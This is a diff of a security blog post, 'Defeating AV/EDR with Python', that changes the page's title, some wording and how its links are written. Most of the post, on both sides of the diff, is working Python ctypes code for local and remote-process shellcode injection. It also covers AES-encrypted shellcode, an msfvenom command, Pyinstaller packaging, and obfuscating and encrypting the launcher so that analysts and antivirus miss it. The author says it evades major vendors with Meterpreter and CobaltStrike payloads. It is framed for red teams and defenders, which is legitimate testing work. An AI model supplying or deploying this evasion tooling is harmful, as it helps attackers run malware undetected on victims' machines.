@@ -12,7 +12,7 @@
 
   <title>
     
-      Defeating Antivirus with Python &middot; m1kemu-sec
+      m1kemu-sec &middot; My mostly security-focused thoughts, projects, and rants
     
   </title>
 
@@ -68,10 +68,14 @@
     
       
     
+      
+        
+      
+    
 
     <a class="sidebar-nav-item" href="https://github.com/m1kemu">Github</a>
-		<a class="sidebar-nav-item" href="https://twitter.com/m1kemu">Twitter</a>
-		<a class="sidebar-nav-item" href="/feed.xml">RSS</a>
+    <a class="sidebar-nav-item" href="https://twitter.com/m1kemu">Twitter</a>
+    <a class="sidebar-nav-item" href="/feed.xml">RSS</a>
     <span class="sidebar-nav-item">Currently v1.0.0</span>
   </nav>
 
@@ -96,9 +100,18 @@
       </div>
 
       <div class="container content">
-        <div class="page">
-  <h1 class="page-title">Defeating Antivirus with Python</h1>
-  <p>Antivirus (AV) has advanced a lot, even in the short years that I’ve spent attempting to evade it. Tricks that I’ve used 2 years ago to get a shell on a endpoint just don’t work anymore. Because of this, I’ve had to resort to trying different methods of shellcode execution on hosts. One thing I’ve noticed is that some common AV tools fail to detect shellcode injection from Pyinstalled binaries. I don’t have a solid explanation for this, but I do have some theories based on the scarce information available on detection logic for specific AV/EDR.</p>
+        <div class="posts">
+  
+  <div class="post">
+    <h1 class="post-title">
+      <a href="//security/2020/05/07/python-av-evasion/">
+        Defeating AV/EDR with Python
+      </a>
+    </h1>
+
+    <span class="post-date">07 May 2020</span>
+
+    <p>Antivirus (AV) and Endpoint Detection and Response (EDR) tools have gotten a lot more advanced in recent years. Tricks that I’ve used 2 years ago to get a shell on a typical endpoint just don’t work anymore. Because of this, I’ve had to resort to trying different methods of shellcode execution on hosts. One thing that I’ve noticed is that some common AV/EDR tools fail to detect shellcode injection from Pyinstalled binaries. I don’t have a solid explanation for this, but I do have some theories based on the scarce information available on detection logic for specific AV/EDR.</p>
 
 <p><strong>Theory 1:</strong> Machine Learning-based AV/EDR don’t have enough Pyinstalled binaries, especially malicious ones, to properly categorize these as malicious.</p>
 
@@ -118,13 +131,13 @@
 
 <h2 id="purpose">Purpose</h2>
 
-<p>In this post, I’m going to review a few Python 3 shellcode injection techniques that are pretty well known, and tie in some other neat tricks to get around AV to execute shellcode. I’m hoping to give Red Teamers/Pentesters a new set of ideas for shellcode execution/AV evasion, and to give Defenders something to test in their own environment.</p>
+<p>In this post, I’m going to review a few Python 3 shellcode injection techniques that are pretty well known, and tie in some other neat tricks to get around AV/EDR tools to execute shellcode. I’m hoping to give Red Teamers/Pentesters a new set of ideas for shellcode execution/AV evasion, and to give Defenders something to test in their own environment.</p>
 
 <p>Before getting started, I should mention a few things:</p>
 <ul>
   <li>These techniques are not novel. I’ll include the references I used, but there are many examples of Python shellcode execution.</li>
   <li>The generated binaries are BIG. There are practical uses, but I wouldn’t consider dropping a 10MB exe to a host ‘stealthy’ in most cases. But hey, a shell is a shell!</li>
-  <li>This technique WILL bypass some of the big name AV vendors. I recommend that Defenders run a variant of this in their environment to test their AV.</li>
+  <li>This technique WILL bypass some of the big name AV/EDR. I recommend that Defenders run a variant of this in their environment to test their AV/EDR.</li>
   <li><strong>As with all of my code/documentation/articles, this is not to be used maliciously. Use this information for good, and follow all laws of your Nation/State/County/City/Home.</strong></li>
 </ul>
 
@@ -134,7 +147,7 @@
 
 <h3 id="development-environment">Development Environment</h3>
 
-<p>I needed a few common tools to develop and test these techniques, and so will you. I’ll include what I used, why I needed it, and some resources below.</p>
+<p>You’re going to need a few things to get started. I’ll include what you need, why you need it, and some resources below.</p>
 <ul>
   <li>Windows 10 VM: Used for testing the launcher script, running Pyinstaller.</li>
   <li>Kali Linux VM: Development host for the encryption/encoding script, hosting the shellcode, generating the shellcode.</li>
@@ -146,15 +159,15 @@
 
 <p>Resources:</p>
 <ul>
-  <li>Legit, temporary Windows 10 VMs: <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></li>
-  <li>Kali Linux: <a href="https://www.kali.org/">https://www.kali.org/</a></li>
-  <li>Python 3: <a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></li>
-  <li>Pyinstaller: <a href="https://www.pyinstaller.org/">https://www.pyinstaller.org/</a></li>
+  <li>Legit, temporary Windows 10 VMs: <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">Windows 10</a></li>
+  <li>Kali Linux: https://www.kali.org/</li>
+  <li>Python 3: https://www.python.org/downloads/</li>
+  <li>Pyinstaller: https://www.pyinstaller.org/</li>
 </ul>
 
 <h3 id="generating-shellcode">Generating Shellcode</h3>
 
-<p>For test purposes, I used generic Windows shellcode for x64 architecture generated using msfvenom. I’ve also tested some other common shellcodes with these techniques.</p>
+<p>For test purposes, generate generic Windows shellcode for x64 architecture using msfvenom.</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f raw -o calc_x64.bin
 </code></pre></div></div>
@@ -226,13 +239,13 @@ shellcode += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellcode.encode('latin-1')
 </code></pre></div></div>
 
-<p>This was a neat little trick to get this running, found <a href="https://www.christophertruncer.com/shellcode-manipulation-and-injection-in-python-3/">here</a>.</p>
+<p>This was a neat little trick to get this running, found here: <a href="https://www.christophertruncer.com/shellcode-manipulation-and-injection-in-python-3/">Latin1</a></p>
 
 <p>These issues won’t apply for how I will run shellcode in this article, but it’s something very important to keep in mind when running shellcode that has been stored in the script itself. Always stay aware of your bytes/string conversions.</p>
 
 <h2 id="encryption-encoding">Encryption, Encoding</h2>
 
-<p>Back to the fun stuff. The first order of business when getting around AV is getting your shellcode into memory without getting caught. There are two main ways that I can see to do this:</p>
+<p>Back to the fun stuff. The first order of business when getting around AV/EDR is getting your shellcode into memory without getting caught. There are two main ways that I can see to do this:</p>
 <ol>
   <li>Store the shellcode (in some form) within the Python script/bin.</li>
   <li>Load the shellcode (in some form) into memory from elsewhere.</li>
@@ -351,13 +364,13 @@ shellcode = aes_decrypt(ciphertext, key, iv)
 
 <p>Shoutout to the always crafty gentlemen/women of Black Hills Information Security. I was able to get this working after long await thanks to the talk and source code they put out.</p>
 
-<p>Code Referenced: <a href="https://github.com/ustayready/python-pentesting/blob/master/pyinjector.py">https://github.com/ustayready/python-pentesting/blob/master/pyinjector.py</a></p>
+<p>Code Referenced: <a href="https://github.com/ustayready/python-pentesting/blob/master/pyinjector.py">Reference Code</a></p>
 
-<p>Author: <a href="https://github.com/ustayready">Mike Feltch</a></p>
+<p>Author: Mike Feltch (https://github.com/ustayready)</p>
 
 <h3 id="the-ctypes-library">The ctypes Library</h3>
 
-<p>The ctypes library offers a few things that will be useful for executing the shellcode. First, it allows us to load the kernel32 DLL, giving me access to the functions that I need within that DLL. It also allows me to load various datatypes useful when calling Windows API functions.</p>
+<p>The ctypes library offers a few things that will be useful for executing the shellcode. First, it allows us to load the kernel32 DLL, giving us access to the functions that we need within that DLL. It also allows us to load various datatypes useful when calling Windows API functions.</p>
 
 <p>Import the libraries.</p>
 
@@ -367,7 +380,7 @@ import ctypes.wintypes
 
 <h3 id="defining-the-kernel32-functions">Defining the kernel32 Functions</h3>
 
-<p>Without defining argtypes for the various kernel functions that I’m using, there will eventually be some odd type-related errors (see below).</p>
+<p>Without defining argtypes for the various kernel functions that we’re using, there will eventually be some odd type-related errors (see below).</p>
 
 <p><img src="/assets/images/python_injection_2.PNG" alt="Error" /></p>
 
@@ -398,33 +411,33 @@ VirtualProtect.restype = ctypes.wintypes.BOOL
 
 <p>References:</p>
 <ul>
-  <li><a href="https://docs.python.org/3/library/ctypes.html">https://docs.python.org/3/library/ctypes.html</a></li>
-  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</a></li>
-  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</a></li>
-  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect</a></li>
+  <li>https://docs.python.org/3/library/ctypes.html</li>
+  <li>https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</li>
+  <li>https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</li>
+  <li>https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect</li>
 </ul>
 
 <h3 id="calling-the-kernel32-functions">Calling the kernel32 Functions</h3>
 
 <p>Now it’s time to actually execute the shellcode. This involves 5 steps.</p>
 
-<p>Allocation of memory using the VirtualAlloc function, ensuring the memory has the read/write/execute protection option. Read/write will not work. (<a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">Reference</a>).</p>
+<p>Allocation of memory using the VirtualAlloc function, ensuring the memory has the read/write/execute protection option. Read/write will not work. (https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc).</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>memptr = VirtualAlloc(0, len(shellcode), MEM_COMMIT, PAGE_READWRITE_EXECUTE)
 </code></pre></div></div>
 
-<p>Copy memory contents from the shellcode memory location to the memory location allocated above using RtlMoveMemory (<a href="https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory">Reference</a>).</p>
+<p>Copy memory contents from the shellcode memory location to the memory location allocated above using RtlMoveMemory (https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory).</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctypes.windll.kernel32.RtlMoveMemory(memptr, shellcode, len(shellcode))
 </code></pre></div></div>
 
-<p>Change the allocated memory region’s protection option to read/execute. This is not necessary, but will make execution of the shellcode less ‘suspicious’. Check out the list of memory protection constants <a href="https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants">here</a>.</p>
+<p>Change the allocated memory region’s protection option to read/execute. This is not necessary, but will make execution of the shellcode less ‘suspicious’. Check out the list of memory protection constants here: https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctypes.windll.kernel32.VirtualProtect(memptr, len(shellcode), PAGE_READ_EXECUTE, 0)
 </code></pre></div></div>
 
-<p>Create a thread that executes the shellcode within the context of the current process (<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">Reference</a>).</p>
+<p>Create a thread that executes the shellcode within the context of the current process (https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread).</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thread = ctypes.windll.kernel32.CreateThread(0, 0, memptr, 0, 0, 0)
 </code></pre></div></div>
 
-<p>Cause the current thread to wait for completed execution of the previously created thread (<a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">Reference</a>).</p>
+<p>Cause the current thread to wait for completed execution of the previously created thread (https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject).</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctypes.windll.kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)
 </code></pre></div></div>
 
@@ -444,7 +457,7 @@ VirtualProtect.restype = ctypes.wintypes.BOOL
 
 <h3 id="finding-a-pid">Finding a PID</h3>
 
-<p>There are a few ways to find running processes that the current user has read/write/execute access to. The easiest ways are to use either the Python <a href="https://psutil.readthedocs.io/en/release-3.2.2/">psutil</a> or <a href="https://pypi.org/project/WMI/">wmi</a> library. I’ll demonstrate using psutil, but either are fine.</p>
+<p>There are a few ways to find running processes that the current user has read/write/execute access to. The easiest ways are to use either the Python psutil (https://psutil.readthedocs.io/en/release-3.2.2/) or wmi (https://pypi.org/project/WMI/) library. I’ll demonstrate using psutil, but either are fine.</p>
 
 <p>Import methods to list running processes and retrieve username running the Launcher.</p>
 
@@ -479,7 +492,7 @@ my_pid = None
                 break
 </code></pre></div></div>
 
-<p>At this point, I have a PID for a process that I can (most likely) inject shellcode into.</p>
+<p>At this point, I have a PID for a process that we can (most likely) inject shellcode into.</p>
 
 <h3 id="defining-the-kernel32-functions-1">Defining the kernel32 Functions</h3>
 
@@ -514,22 +527,22 @@ WriteProcessMemory.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPVOID, c
 WriteProcessMemory.restype = ctypes.wintypes.BOOL
 </code></pre></div></div>
 
-<p>You should notice that these functions look similar to those defined for the previous method. The functions ending in ‘ex’ serve similar purposes as their counterparts used previously, but act on a remote process. There are also a few functions included here to handle (heh…) remote processes. Once again, I’ll provide a brief explanation of these functions, but check out the references below.</p>
+<p>You should notice that these functions look similar to those defined for the previous method. The functions ending in ‘ex’ serve similar perposes as their counterparts used previously, but act on a remote process. There are also a few functions included here to handle (heh…) remote processes. Once again, I’ll provide a brief explanation of these functions, but check out the references below.</p>
 
 <p>References:</p>
 <ul>
-  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory</a></li>
-  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread</a></li>
-  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess</a></li>
-  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex</a></li>
-  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex</a></li>
+  <li>https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory</li>
+  <li>https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread</li>
+  <li>https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess</li>
+  <li>https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex</li>
+  <li>https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex</li>
 </ul>
 
 <h3 id="calling-the-kernel32-functions-1">Calling the kernel32 Functions</h3>
 
 <p>With the functions defined, it’s time to execute the shellcode.</p>
 
-<p>First, I need to obtain a handle for the target process with the PROCESS_VM_WRITE and PROCESS_VM_OPERATION access rights (<a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">Reference</a>). A handle is basically an identifier for the process in integer format used across Windows API functions. Note that the PID found earlier is passed here.</p>
+<p>First, I need to obtain a handle for the target process with the PROCESS_VM_WRITE and PROCESS_VM_OPERATION access rights (see: https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights). A handle is basically an identifier for the process in integer format used across Windows API functions. Note that the PID found earlier is passed here.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>handle = OpenProcess(0x00028, False, my_pid)
 </code></pre></div></div>
 
@@ -541,7 +554,7 @@ WriteProcessMemory.restype = ctypes.wintypes.BOOL
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>result = WriteProcessMemory(handle, memptr, sc, len(sc), 0)
 </code></pre></div></div>
 
-<p>Change protection of the allocated memory region to Read/Execute (<a href="https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants">Reference</a>). There is no need for the Write attribute since we’ve already written the shellcode to this region.</p>
+<p>Change protection of the allocated memory region to Read/Execute (see: https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants). There is no need for the Write attribute since we’ve already written the shellcode to this region.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>result = VirtualProtectEx(handle, memptr, len(sc), 0x20, 0)
 </code></pre></div></div>
 
@@ -582,13 +595,13 @@ WriteProcessMemory.restype = ctypes.wintypes.BOOL
 .\Launcher.exe
 </code></pre></div></div>
 
-<p>You should have gotten a calc.exe if you’re following along.</p>
+<p>You should have gotten a calc.exe.</p>
 
-<p><strong>Note:</strong> Pyinstalled binaries are OS specific. You should compile the binary on the same OS version/architecture that you are targeting.</p>
+<p>Note: Pyinstalled binaries are OS specific. You should compile the binary on the same OS version/architecture that you are targeting.</p>
 
 <h2 id="obfuscating-the-python-code">Obfuscating the Python Code</h2>
 
-<p>One of the downsides of running Pyinstalled binaries on a target is that the source Python scripts aren’t truly ‘compiled’. Pyinstaller includes compiled .pyc files within the generated bundle, which can be extracted and analyzed to reveal the original Python code. This is a problem for Offensive teams, because it can allow even unskilled analysts to see the Launcher logic. For Defenders looking to test out analyzing Pyinstalled binaries, <a href="https://github.com/countercept/python-exe-unpacker">check this out</a>.</p>
+<p>One of the downsides of running Pyinstalled binaries on a target is that the source Python scripts aren’t truly ‘compiled’. Pyinstaller includes compiled .pyc files within the generated bundle, which can be extracted and analyzed to reveal the original Python code. This is a problem for Offensive teams, because it can allow even unskilled analysts to see the Launcher logic. For Defenders looking to test out analyzing Pyinstalled binaries, check this out: https://github.com/countercept/python-exe-unpacker.</p>
 
 <p>For Offensive folks looking to further defend against Defenders/AV/EDR, keep reading…</p>
 
@@ -673,7 +686,7 @@ if __name__ == '__main__':
 
 <h3 id="pyinstaller-encryption">PyInstaller Encryption</h3>
 
-<p>Another technique to throw analysts and AV off your trail is using PyInstaller’s –key option. This will encrypt the Python bytecode using a key passed to this command line parameter.</p>
+<p>Another technique to throw analysts and AV/EDR off your trail is using PyInstaller’s –key option. This will encrypt the Python bytecode using a key passed to this command line parameter.</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pyinstaller.exe --key=mypassword123456 --onefile .\Launcher.py
 </code></pre></div></div>
@@ -682,7 +695,7 @@ if __name__ == '__main__':
 
 <h2 id="weaponization">Weaponization</h2>
 
-<p>These techniques can be used to bypass various AV tools when running shellcode. Thus far, I’ve tested this with generic Windows command execution shellcodes, Meterpreter shells, and CobaltStrike beacon shellcode with success. While these techniques work, I’ve only touched the surface, and I certainly haven’t provided the best code examples. I can see a lot of cool ways to ‘weaponize’ this for use in a Campaign, notably:</p>
+<p>These techniques can be used to bypass various AV/EDR tools when running shellcode. Thus far, I’ve tested this with generic Windows command execution shellcodes, Meterpreter shells, and CobaltStrike beacon shellcode with success. While these techniques work, I’ve only touched the surface, and I certainly haven’t provided the best code examples. I can see a lot of cool ways to ‘weaponize’ this for use in a Campaign, notably:</p>
 <ul>
   <li>Creating a script to encrypt/encode/format the shellcode in various ways</li>
   <li>Creating a script to populate a launcher template with this information</li>
@@ -697,11 +710,26 @@ if __name__ == '__main__':
 
 <h2 id="conclusion">Conclusion</h2>
 
-<p>For the Offensive folks, I hope I’ve given you some good ideas on getting shellcode around around AV tools using Python. For such an old trick, it really stands up well. For the Defensive folks, I recommend taking a deeper look at these types of binaries. I can’t foresee many situations where they would be very useful, but there are a few. If new ways of executing Python scripts on Windows (Ironpython?), I can can imagine the use of python for shellcode execution will become more popular.</p>
+<p>For the Offensive folks, I hope I’ve given you some good ideas on getting shellcode around around AV/EDR tools using Python. For such an old trick, it really stands up well. For the Defensive folks, I recommend taking a deeper look at these types of binaries. I can’t foresee many situations where they would be very useful, but there are a few. If new ways of executing Python scripts on Windows (Ironpython?), I can can imagine the use of python for shellcode execution will become more popular.</p>
 
 <p>Thanks for reading.</p>
 
+
+  </div>
+  
 </div>
+
+<div class="pagination">
+  
+    <span class="pagination-item older">Older</span>
+  
+  
+    
+      <a class="pagination-item newer" href="/">Newer</a>
+    
+  
+</div>
+
 
       </div>
     </div>
